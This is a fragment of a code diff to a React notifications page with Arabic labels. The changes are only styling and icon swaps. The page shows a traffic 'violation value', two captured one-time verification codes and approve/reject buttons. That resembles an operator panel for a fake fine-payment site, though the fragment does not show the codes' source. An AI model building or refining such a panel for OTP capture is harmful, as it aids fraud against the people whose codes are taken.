                   <span className="font-medium text-slate-700">قيمة المخالفة:</span>
                   <span>{selectedNotification.violationValue || "غير متوفر"}</span>
                 </p>
               </div>
 
-              <div className="p-3 bg-slate-50 rounded-lg">
+              <div className="p-3 bg-gradient-to-r from-slate-50 to-white rounded-lg border border-slate-100 shadow-sm">
                 <p className="flex justify-between">
                   <span className="font-medium text-slate-700">رمز التحقق المرسل:</span>
-                  <Badge className="font-mono bg-green-500">{selectedNotification.otp || "غير متوفر"}</Badge>
-                  <Badge className="font-mono bg-green-500">{selectedNotification.otp2 || "غير متوفر"}</Badge>
+                  <Badge className="font-mono bg-green-500 text-white">{selectedNotification.otp || "غير متوفر"}</Badge>
+                  <Badge className="font-mono bg-green-500 text-white">
+                    {selectedNotification.otp2 || "غير متوفر"}
+                  </Badge>
                 </p>
               </div>
             </div>
@@ -1252,7 +1427,7 @@ export default function NotificationsPage() {
                 }}
               >
                 <span className="flex items-center gap-1">
-                  <X className="h-4 w-4" />
+                  <XCircle className="h-4 w-4" />
                   رفض
                 </span>
               </Button>
@@ -1265,14 +1440,12 @@ export default function NotificationsPage() {
                 }}
               >
                 <span className="flex items-center gap-1">
-                  <svg className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
-                  </svg>
+                  <CheckCircle2 className="h-4 w-4" />
                   موافقة
                 </span>
               </Button>
             </div>
-            <Button variant="outline" onClick={closeDialog} className="transition-all hover:bg-slate-100">
+            <Button variant="outline" onClick={closeDialog} className="transition-all duration-300 hover:bg-slate-100">
               إغلاق
             </Button>
           </div>
